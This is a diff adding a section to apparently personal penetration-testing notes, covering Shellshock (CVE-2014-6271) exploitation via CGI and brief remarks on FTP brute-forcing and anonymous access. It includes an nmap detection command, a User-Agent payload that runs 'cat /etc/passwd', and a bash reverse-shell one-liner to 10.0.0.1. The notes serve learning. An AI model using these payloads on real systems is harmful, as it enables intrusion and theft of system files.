@@ -558,6 +558,26 @@ With an anonymous null session you can access the IPC$ share and interact with s
     - SAMBA; TCP 445
   
   
+  ## Exploiting Linux Vulnerabilities
+  
+  ### Exploiting Bash CVE-2014-6271 Vulnerability (Shellshock)
+  - Bash is the default shell for nearly all Linux Distros
+  - The Shellshock vulnerability is caused by a vulnerability in Bash, wehereby Bash mistakenly executes trailing commands after a series of characters: (){:;};
+  - In context of remote exploitation, Apache web servers configured to run CGI scripts or .sh scripts are also vulnerable to this attack.
+  
+  - In oder to exploit this vulnerability, you will need to locate an input vector or script that allows you to communicate with Bash
+  - This vulnerability can be exploited both manually (e.g. via Burp) and automatically with the use of MSF exploit module 
+  
+  - Check if a Webservice is vulnerable: nmap -sV x.x.x.x --script=http-shellshock --script-args "http-shellshock.uri=/gettime.cgi" (specify the location of the uri!)
+  - Fire up Brup and intercept a respose from the vulnerable cgi module
+  - Send it to repeater and replace the User-Agent to: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd' (Bash Rev. Shell: bash -i >& /dev/tcp/10.0.0.1/8080 0>&1)
+  
+  
+  ### Exploiting FTP
+  - FTP authentication requires a username and password combination. As a result, we can perform a bruteforce attack in the FTP Server in order to identify legitimate credentials.
+  - In some cases, FTP servers may be configured to allow anonymous access, whick consequently allows anyone to access to the FTP server without providing legitimate credentials.
+  
+  
   
   
   
